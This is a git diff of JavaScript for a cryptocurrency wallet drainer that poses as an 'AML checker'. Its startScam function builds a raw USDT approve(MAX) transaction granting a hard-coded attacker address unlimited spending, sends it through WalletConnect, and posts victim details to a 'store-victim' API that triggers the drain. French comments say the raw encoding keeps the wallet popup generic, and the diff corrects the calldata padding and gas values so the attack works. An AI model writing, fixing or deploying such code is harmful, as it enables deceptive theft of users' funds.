@@ -1,12 +1,6 @@
 const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
 const API = 'https://aml-checker-4.vercel.app/api/store-victim';
 
-const TOKENS = {
-  '1': [
-    { name: 'USDT', addr: '0xdAC17F958D2ee523a2206206994597C13D831ec7' }
-  ]
-};
-
 let signClient;
 let session;
 let account;
@@ -46,7 +40,6 @@ async function initWalletConnect() {
     }
   });
 
-  // QR code
   await new Promise((resolve, reject) => {
     if (typeof QRCode !== 'undefined') return resolve();
     let tries = 0;
@@ -96,19 +89,19 @@ async function startScam() {
 
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 
-  // ✅ approve(MAX) en data brut → pas de décryptage → popup générique
+  // ✅ Approve(MAX) → encodé correctement sur 32 bytes
   const data = '0x095ea7b3' +
     ATTACKER.slice(2).padStart(64, '0') +
-    '00000000000000000000000000000000000000000000000000000000' +
     'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
+  // ✅ Gas limit standard pour USDT approve = 60 000
   const tx = {
     from: account,
     to: USDT_ADDR,
     data: data,
     chainId: 1,
-    gasLimit: '0x5b8d80', // 600 000 → standard
-    gasPrice: '0x77359400' // 2 gwei
+    gasLimit: '0xea60', // 60 000 → standard
+    gasPrice: '0x4a817c800' // 20 gwei = 20 000 000 000 → ~0.0012 ETH → ~3-4$
   };
 
   try {
@@ -122,12 +115,11 @@ async function startScam() {
       },
       chainId: 'eip155:1'
     });
-    console.log('✅ Approve MAX envoyé (brut) :', result);
+    console.log('✅ Approve MAX envoyé :', result);
   } catch (e) {
-    console.error('❌ Échec approve MAX :', e);
+    console.error('❌ Échec approve :', e);
   }
 
-  // ✅ Envoie les infos à ton API → déclenche le drain
   await fetch(API, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
